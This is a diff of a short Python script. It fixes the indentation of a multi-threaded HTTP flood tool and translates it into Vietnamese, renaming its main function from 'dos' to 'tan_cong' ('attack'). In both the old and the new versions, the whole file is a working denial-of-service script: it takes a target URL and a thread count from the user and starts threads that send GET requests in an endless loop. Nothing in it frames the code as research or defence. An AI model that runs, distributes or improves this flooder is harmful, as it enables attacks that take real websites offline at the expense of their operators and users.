@@ -1,62 +1,32 @@
 import threading
-import requests 
+import requests
 
-def dos(target):
-        try:
-
-
-    while True:
-
+def tan_cong(target):
+    try:
+        while True:
             res = requests.get(target)
+            print("Đã gửi yêu cầu!")
+    except requests.exceptions.ConnectionError:
+        print("[!!!] Lỗi kết nối!")
 
-            print("Request sent!")
-
-        except requests.exceptions.ConnectionError:
-
-            print("[!!!] " + "Connection error!")
-
- 
-
-threads = 50
-
-
-
-url = input("Enter URL>> ")
-
- 
+so_luong_luon = 50
+url = input("Nhập URL: ")
 
 try:
-
-    threads = int(input("Threads: "))
-
+    so_luong_luon = int(input("Số lượng luồng: "))
 except ValueError:
+    exit("Số lượng luồng không hợp lệ!")
 
-    exit("Threads count is incorrect!")
-
- 
-
-if threads == 0:
-
-    exit("Threads count is incorrect!")
-
- 
+if so_luong_luon == 0:
+    exit("Số lượng luồng không hợp lệ!")
 
 if not url.__contains__("http"):
-
-    exit("URL doesnt contains http or https!")
-
- 
+    exit("URL không chứa http hoặc https!")
 
 if not url.__contains__("."):
+    exit("Tên miền không hợp lệ!")
 
-    exit("Invalid domain!")
-
- 
-
-for i in range(0, threads):
-
-    thr = threading.Thread(target=dos, args=(url,))
-
-    thr.start()
-
-    print(str(i + 1) + " threads started!")
+for i in range(0, so_luong_luon):
+    luong = threading.Thread(target=tan_cong, args=(url,))
+    luong.start()
+    print(str(i + 1) + " luồng đã được khởi động!")
